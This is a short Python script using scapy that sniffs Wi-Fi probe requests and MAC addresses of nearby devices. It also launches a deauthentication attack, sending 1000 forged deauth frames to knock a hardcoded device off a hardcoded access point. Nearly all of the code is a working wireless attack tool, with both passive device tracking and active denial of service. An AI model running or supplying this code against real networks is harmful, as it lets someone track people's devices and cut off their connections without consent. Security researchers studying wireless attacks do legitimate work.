import argparse
from scapy.all import *

interface= "wlx00c0ca84aba2"
probeReqs = []
macAddresses = []

def sniffProbeRequests(pkt):
	if pkt.haslayer(Dot11ProbeReq):
		netName = pkt.getlayer(Dot11ProbeReq).info
		if netName not in probeReqs:
			probeReqs.append(netName)
			print "[+] Detected new probe request: " + netName

def sniffAllMacAddresses(pkt):
	if pkt.haslayer(Dot11ProbeReq):
		layer = pkt.getlayer(Dot11)

		if layer.addr2 and (layer.addr2 not in macAddresses):
			macAddresses.append(layer.addr2)
			print "[+] Detected new mac address: " + layer.addr2

def getProbeRequests(macs):
    print "getting probe requests.."
    sniff(iface=interface, prn=sniffProbeRequests)


def getAllMacAddresses(macs):
	print "getting all mac addresses on network.."
	sniff(iface=interface, prn=sniffAllMacAddresses)

def deauthDevice(macs):
	print "deauthing.."
	ap_mac = "48:00:33:B7:CE:D8"
	device_mac = "60:be:b5:f0:23:b1"
	pkt = RadioTap() / Dot11( addr1 = ap_mac, addr2 = device_mac, addr3=device_mac) / Dot11Deauth() 
	sendp(pkt, iface=interface, count=1000, inter=.1)



parser = argparse.ArgumentParser()
parser.add_argument("-p", help="list all probe requests",
                    type=getProbeRequests,
                    action="store")
parser.add_argument("-m", help="get all mac addresses",
                    type=getAllMacAddresses,
                    action="store")
parser.add_argument("-d", help="deauth a device",
                    type=deauthDevice,
                    action="store")
args = parser.parse_args()